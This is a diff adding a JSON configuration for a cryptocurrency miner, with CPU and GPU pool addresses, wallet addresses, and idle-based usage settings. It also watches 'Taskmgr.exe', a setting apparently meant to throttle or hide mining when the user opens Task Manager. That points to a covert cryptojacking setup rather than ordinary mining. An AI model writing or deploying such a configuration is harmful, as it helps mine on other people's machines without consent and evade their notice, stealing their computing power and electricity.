@@ -1,0 +1,23 @@
+{
+  "cpu_config": {
+    "mining_url": "pool.hashvault.pro:443",
+    "wallet": "83Z3CtEhU1LWKkwZUoKE3sH7mRZX2tfMxKfgncMzNqY81eCFACMgfqE5dPoodVXBpSYK7UYNx8NSkEfwwap9GXtRV1ZRyMG",
+    "password": "0111",
+    "non_idle_usage": 30,
+    "idle_usage": 80,
+    "wait_time_idle": 2,
+    "use_ssl": 1
+  },
+  "gpu_config": {
+    "mining_url": "pool.pearlhash.xyz:9000",
+    "wallet": "prl1pnpw6q3s33spxcystr43gelja8aehpurlv2279qag5ukcmty2vsmq9kvl92",
+    "password": "0111",
+    "algo": "pearlhash",
+    "fan_speed": 80,
+    "wait_time_idle": 2,
+    "use_ssl": 0
+  },
+  "enable_cpu": 0,
+  "enable_gpu": 1,
+  "watched_processes": ["Taskmgr.exe"]
+}
